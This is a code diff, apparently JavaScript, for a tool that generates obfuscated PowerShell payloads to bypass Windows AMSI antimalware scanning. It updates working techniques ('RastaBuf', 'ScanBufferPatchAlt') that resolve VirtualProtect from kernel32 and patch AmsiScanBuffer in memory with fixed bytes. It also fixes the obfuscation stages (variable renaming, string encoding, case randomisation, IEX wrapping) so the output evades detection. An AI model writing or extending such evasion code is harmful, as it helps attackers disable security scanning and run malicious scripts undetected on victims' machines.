@@ -70,25 +70,73 @@ const PS_AUTOVARS = new Set([
 // PSPayload factory
 // ============================================================
 
+// Shared parser helper: skips here-strings, quoted strings, tracks depth
+// Calls onChar(c, i, context) for each char outside strings/here-strings
+// context = { inHereString, inString, depth }
+function parsePS(raw, onChar) {
+  let inHereString = false;
+  let inString = false;
+  let stringChar = '';
+  let depth = 0;
+  for (let i = 0; i < raw.length; i++) {
+    const c = raw[i];
+    // Here-string detection: @" opens, "@ at start-of-line closes
+    if (inHereString) {
+      if (c === '"' && raw[i - 1] === '\n' && raw[i + 1] === '@') {
+        i += 1; // skip the @
+        inHereString = false;
+      }
+      continue;
+    }
+    if (c === '@' && raw[i + 1] === '"' && (i === 0 || raw[i - 1] === '=' || raw[i - 1] === ' ')) {
+      inHereString = true;
+      i += 1; // skip the "
+      continue;
+    }
+    if (inString) {
+      if (c === stringChar && raw[i - 1] !== '`') inString = false;
+      continue;
+    }
+    if (c === '"' || c === "'") { inString = true; stringChar = c; continue; }
+    if (c === '{' || c === '(') { depth++; }
+    if (c === '}' || c === ')') { depth--; }
+    onChar(c, i, { depth, inHereString, inString });
+  }
+}
+
+// Detect here-string regions in raw PS, returns array of {start, end} (inclusive)
+function findHereStringRegions(raw) {
+  const regions = [];
+  let start = -1;
+  for (let i = 0; i < raw.length; i++) {
+    if (start === -1) {
+      if (raw[i] === '@' && raw[i + 1] === '"' && (i === 0 || raw[i - 1] === '=' || raw[i - 1] === ' ')) {
+        start = i;
+        i += 1;
+      }
+    } else {
+      if (raw[i] === '"' && raw[i - 1] === '\n' && raw[i + 1] === '@') {
+        regions.push({ start, end: i + 1 });
+        start = -1;
+        i += 1;
+      }
+    }
+  }
+  return regions;
+}
+
+function isInsideHereString(pos, regions) {
+  return regions.some(r => pos >= r.start && pos <= r.end);
+}
+
 function createPayload({ raw, technique, variables = [], sensitiveStrings = [], statements = null }) {
   if (statements === null) {
     statements = [];
-    let depth = 0;
-    let inString = false;
-    let stringChar = '';
-    for (let i = 0; i < raw.length; i++) {
-      const c = raw[i];
-      if (inString) {
-        if (c === stringChar && raw[i - 1] !== '`') inString = false;
-        continue;
-      }
-      if (c === '"' || c === "'") { inString = true; stringChar = c; continue; }
-      if (c === '{' || c === '(') { depth++; continue; }
-      if (c === '}' || c === ')') { depth--; continue; }
-      if ((c === ';' || c === '\n') && depth === 0) {
+    parsePS(raw, (c, i, ctx) => {
+      if ((c === ';' || c === '\n') && ctx.depth === 0) {
         statements.push(i);
       }
-    }
+    });
   }
   return { raw, technique, variables, sensitiveStrings, statements };
 }
@@ -234,7 +282,7 @@ TechniqueRegistry.register({
       raw,
       technique: 'MattGRef02',
       variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vCtx}`],
-      sensitiveStrings: ['AmsiUtils', 'amsiContext', 'WriteInt32']
+      sensitiveStrings: ['AmsiUtils', 'amsiContext']
     });
   }
 });
@@ -251,15 +299,20 @@ TechniqueRegistry.register({
     const vAddr = randomVarName();
     const vOld = randomVarName();
     const vPatch = randomVarName();
-    const vVp = randomVarName();
+    const vK32 = randomVarName();
+    const vVpAddr = randomVarName();
+    const vVpDel = randomVarName();
 
+    // VirtualProtect is NOT on UnsafeNativeMethods — resolve it via GetProcAddress from kernel32
     const raw =
       genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
       `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
       `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
-      `$${vVp}=$${vUnsafe}.GetMethod('VirtualProtect');` +
-      `$${vOld}=0;` +
-      `$${vVp}.Invoke($null,@($${vAddr},[uint32]5,[uint32]0x40,$${vOld}));` +
+      `$${vK32}=$${vLoadLib}.Invoke($null,@('kernel32.dll'));` +
+      `$${vVpAddr}=$${vGetProc}.Invoke($null,@($${vK32},'VirtualProtect'));` +
+      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},[Func[IntPtr,UInt32,UInt32,[UInt32].MakeByRefType(),[Bool]]]);` +
+      `$${vOld}=[uint32]0;` +
+      `$${vVpDel}.Invoke($${vAddr},6,0x40,[ref]$${vOld});` +
       `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
       `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;
 
@@ -268,9 +321,10 @@ TechniqueRegistry.register({
       technique: 'RastaBuf',
       variables: [
         `$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`,
-        `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`, `$${vVp}`
+        `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`,
+        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`
       ],
-      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods']
+      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods', 'kernel32.dll']
     });
   }
 });
@@ -310,21 +364,32 @@ TechniqueRegistry.register({
     const vAddr = randomVarName();
     const vOld = randomVarName();
     const vPatch = randomVarName();
+    const vK32 = randomVarName();
+    const vVpAddr = randomVarName();
+    const vVpDel = randomVarName();
 
+    // VirtualProtect resolved via GetProcAddress from kernel32, not UnsafeNativeMethods
     const raw =
       genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
       `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
       `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
-      `$${vOld}=0;` +
-      `$${vUnsafe}.GetMethod('VirtualProtect').Invoke($null,@($${vAddr},[uint32]5,[uint32]0x40,$${vOld}));` +
+      `$${vK32}=$${vLoadLib}.Invoke($null,@('kernel32.dll'));` +
+      `$${vVpAddr}=$${vGetProc}.Invoke($null,@($${vK32},'VirtualProtect'));` +
+      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},[Func[IntPtr,UInt32,UInt32,[UInt32].MakeByRefType(),[Bool]]]);` +
+      `$${vOld}=[uint32]0;` +
+      `$${vVpDel}.Invoke($${vAddr},6,0x40,[ref]$${vOld});` +
       `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
       `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;
 
     return createPayload({
       raw,
       technique: 'ScanBufferPatchAlt',
-      variables: [`$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`, `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`],
-      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods']
+      variables: [
+        `$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`,
+        `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`,
+        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`
+      ],
+      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods', 'kernel32.dll']
     });
   }
 });
@@ -470,7 +535,7 @@ function obfuscateInt(int) {
     case 3: return `(${int})`;
     case 4: {
       const mask = randomInt(65536);
-      return `(0x${(int ^ mask).toString(16)} -bxor 0x${mask.toString(16)})`;
+      return `(0x${((int ^ mask) >>> 0).toString(16)} -bxor 0x${mask.toString(16)})`;
     }
     case 5: {
       const log2 = Math.log2(int);
@@ -490,9 +555,12 @@ function charEncodeAsByte(char) {
 }
 
 function encodeStringChars(str) {
-  return str.split('').map(c =>
+  const parts = str.split('').map(c =>
     Math.round(Math.random()) ? charEncodeAsChar(c) : charEncodeAsByte(c)
-  ).join('+');
+  );
+  // Cast first element to [string] so PS treats + as string concatenation, not integer addition
+  if (parts.length > 1) parts[0] = '[string]' + parts[0];
+  return parts.join('+');
 }
 
 const DIACRITIC_MAP = {
@@ -527,7 +595,7 @@ function encodeStringDiacritic(str) {
 }
 
 function encodeStringFormat(str) {
-  if (str.length < 2) return encodeStringChars(str);
+  if (str.length < 2 || str.includes("'")) return encodeStringChars(str);
   const numSplits = randomRange(1, Math.min(4, str.length));
   const points = new Set();
   while (points.size < numSplits) {
@@ -556,6 +624,8 @@ function encodeStringBytes(str) {
 }
 
 function encodeStringReverse(str) {
+  // If string contains single quotes, fall back to char encoding
+  if (str.includes("'")) return encodeStringChars(str);
   const reversed = str.split('').reverse().join('');
   const len = str.length;
   return `('${reversed}'[${obfuscateInt(len - 1)}..0] -join '')`;
@@ -604,8 +674,33 @@ ObfuscationPipeline.addStage({
       newVars.push(newName);
       const bare = v.slice(1);
       const newBare = newName.slice(1);
-      raw = raw.split('$' + bare).join('$' + newBare);
-      raw = raw.replace(new RegExp(`(?<!\\$)\\b${bare}\\b`, 'g'), newBare);
+      // Replace $var references outside here-strings
+      const hereRegions = findHereStringRegions(raw);
+      const varPattern = new RegExp('\\$' + bare.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\b', 'g');
+      let match;
+      const replacements = [];
+      while ((match = varPattern.exec(raw)) !== null) {
+        if (!isInsideHereString(match.index, hereRegions)) {
+          replacements.push({ start: match.index, end: match.index + match[0].length });
+        }
+      }
+      for (let i = replacements.length - 1; i >= 0; i--) {
+        const r = replacements[i];
+        raw = raw.slice(0, r.start) + '$' + newBare + raw.slice(r.end);
+      }
+      // Also replace bare class name references (e.g., [ClassName]::) outside here-strings
+      const hereRegions2 = findHereStringRegions(raw);
+      const barePattern = new RegExp(`(?<!\\$)\\b${bare.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'g');
+      const replacements2 = [];
+      while ((match = barePattern.exec(raw)) !== null) {
+        if (!isInsideHereString(match.index, hereRegions2)) {
+          replacements2.push({ start: match.index, end: match.index + match[0].length });
+        }
+      }
+      for (let i = replacements2.length - 1; i >= 0; i--) {
+        const r = replacements2[i];
+        raw = raw.slice(0, r.start) + newBare + raw.slice(r.end);
+      }
     }
 
     return { ...payload, raw, variables: newVars };
@@ -620,8 +715,34 @@ ObfuscationPipeline.addStage({
 
     for (const word of sensitiveStrings) {
       const obf = obfuscateString(word);
+      // Replace exactly-quoted occurrences: 'word' → $(obf)
       raw = raw.split(`'${word}'`).join(`$(${obf})`);
-      raw = raw.split(word).join(`'+$(${obf})+'`);
+
+      // For bare occurrences, only replace those inside single-quoted strings
+      // (i.e., word is a substring of a larger 'string.with.Word.in.it')
+      // Do NOT replace bare code references like ::MethodName( or .TypeName
+      const escaped = word.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      const re = new RegExp(escaped, 'g');
+      let match;
+      const replacements = [];
+      const hereRegions = findHereStringRegions(raw);
+      while ((match = re.exec(raw)) !== null) {
+        if (isInsideHereString(match.index, hereRegions)) continue;
+        // Check if this occurrence is inside a single-quoted string
+        const before = raw.slice(0, match.index);
+        const after = raw.slice(match.index + word.length);
+        // Count unescaped single quotes before this position
+        const quotesBefore = (before.match(/'/g) || []).length;
+        // Odd number of quotes = we're inside a quoted string
+        if (quotesBefore % 2 === 1) {
+          replacements.push({ start: match.index, end: match.index + word.length });
+        }
+      }
+      // Apply replacements in reverse order to preserve positions
+      for (let i = replacements.length - 1; i >= 0; i--) {
+        const r = replacements[i];
+        raw = raw.slice(0, r.start) + `'+$(${obf})+'` + raw.slice(r.end);
+      }
     }
 
     raw = raw.replace(/''\+'/g, "'");
@@ -655,16 +776,13 @@ ObfuscationPipeline.addStage({
   process(payload) {
     let { raw } = payload;
 
+    const hereRegions = findHereStringRegions(raw);
     const boundaries = [];
-    let depth = 0, inStr = false, strChar = '';
-    for (let i = 0; i < raw.length; i++) {
-      const c = raw[i];
-      if (inStr) { if (c === strChar && raw[i - 1] !== '`') inStr = false; continue; }
-      if (c === '"' || c === "'") { inStr = true; strChar = c; continue; }
-      if (c === '{' || c === '(' || c === '[') { depth++; continue; }
-      if (c === '}' || c === ')' || c === ']') { depth--; continue; }
-      if (c === ';' && depth === 0) boundaries.push(i);
-    }
+    parsePS(raw, (c, i, ctx) => {
+      if (c === ';' && ctx.depth === 0 && !isInsideHereString(i, hereRegions)) {
+        boundaries.push(i);
+      }
+    });
 
     if (boundaries.length < 2) return { ...payload, raw };
 
@@ -710,12 +828,29 @@ ObfuscationPipeline.addStage({
   process(payload) {
     let { raw } = payload;
 
+    const hereRegions = findHereStringRegions(raw);
     let result = '';
     let inStr = false;
     let strChar = '';
+    let inHereString = false;
 
     for (let i = 0; i < raw.length; i++) {
       const c = raw[i];
+      // Track here-strings: content is C# code, must not randomize case
+      if (inHereString) {
+        result += c;
+        if (c === '"' && raw[i - 1] === '\n' && raw[i + 1] === '@') {
+          result += '@';
+          i += 1;
+          inHereString = false;
+        }
+        continue;
+      }
+      if (c === '@' && raw[i + 1] === '"' && (i === 0 || raw[i - 1] === '=' || raw[i - 1] === ' ')) {
+        inHereString = true;
+        result += c;
+        continue;
+      }
       if (inStr) {
         result += c;
         if (c === strChar && raw[i - 1] !== '`') inStr = false;
@@ -743,8 +878,12 @@ ObfuscationPipeline.addStage({
   name: 'expressionWrapping',
   process(payload) {
     let { raw } = payload;
+    const hasHereString = findHereStringRegions(raw).length > 0;
 
-    switch (randomInt(3)) {
+    // IEX wrapping (case 1) escapes " to `" which destroys here-string
+    // delimiters @" and "@ — skip IEX for techniques with here-strings
+    const choices = hasHereString ? [0, 2] : [0, 1, 2];
+    switch (pickRandom(choices)) {
       case 0:
         raw = `& {${raw}}`;
         break;
